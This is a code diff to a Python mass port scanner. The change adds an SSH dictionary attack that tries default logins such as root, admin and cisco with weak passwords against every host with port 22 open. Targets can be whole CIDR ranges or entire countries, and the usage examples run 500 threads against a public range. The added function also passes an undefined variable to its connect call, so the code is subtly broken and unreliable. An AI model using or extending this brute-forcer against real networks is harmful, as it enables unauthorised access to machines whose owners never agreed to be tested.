@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
-import socket, threading,sys,ipaddress,datetime,os,requests,hashlib,urllib
+import socket, threading,sys,ipaddress,datetime,os,paramiko
+#import requests,hashlib,urllib
 
 
 def countries():
@@ -50,7 +51,19 @@ def chunks(lst, n):
     for i in range(0, len(lst), n):
         yield lst[i:i + n]
 
-
+def sshcheck(ip):
+    print('ssh')
+    client = paramiko.client.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    users = ['root','admin','cisco'] #,'user','oracle']
+    pwds = ['cisco','123456','admin','password']#,'user','root','oracle','letmein','administrator','webadmin','webmaster','Passw@rd']
+    for user in users:
+        for pwd in pwds:
+            try:
+                client.connect(host, username=user, password=pwd)
+                print(ip+' > '+user+':'+pwd)
+            except:
+                pass
 
 targets=[]
 def TCP_connect(ip, port, delay):
@@ -62,7 +75,11 @@ def TCP_connect(ip, port, delay):
     TCPsock.close()
     if r==0:
         url=ip+':'+str(port)
-       
+        if sshflag:
+            
+            sshcheck(ip)
+        
+        
         #try:
             #re=urllib.request.urlretrieve('http://'+url+'/favicon.ico', "icon")
 
@@ -101,13 +118,15 @@ def scan_ports(iplist, delay,port):
                 quit('CTRL+C signal')
 help= """Usage:
 
-./bullets <networkAddress/CIDR>/<Country code> <Port> <NumberOfThreads> [browser]
+./bullets <networkAddress/CIDR>/<Country code> <Port> <NumberOfThreads> [browser/brute]
 
 <Country code> : Country code represented in two alphabets,type ./sniper --countries for more info
 
 [browser] :browser name is optinal, it activates IPs browsing; make sure [browser] is callable from any directory.
+[brute]   :ssh dictionary attack
 
 Examples: ./bullets.py 196.217.254.0/24 8080 200 firefox
+          ./bullets.py 196.217.254.0/24 22 500 brute
           ./bullets.py us 8080 200 firefox 
           ./bullets.py  196.217.254.0/24 80 100
           ./bullets.py us 8080 200"""
@@ -123,11 +142,19 @@ def main():
     global webflag
     webflag=0 
     
+    
     if len(sys.argv[1])==2:
         netip=geo(sys.argv[1])
     
     else:netip=sys.argv[1]
-
+    
+    global sshflag
+    sshflag=0
+    try:
+        if sys.argv[4] == 'brute':     
+            sshflag=1
+    except:
+        pass
     port = int(sys.argv[2])
     nthread = int(sys.argv[3])
     try:
@@ -169,7 +196,8 @@ elif tl[0] != '0':
 elif tl[1] != '00':
         print(tl[1]+'m'+tl[2]+'s')
 #browsing IPs
-
+if sshflag:
+    quit()
 num = len(targets)
 c=0
 if webflag and num:
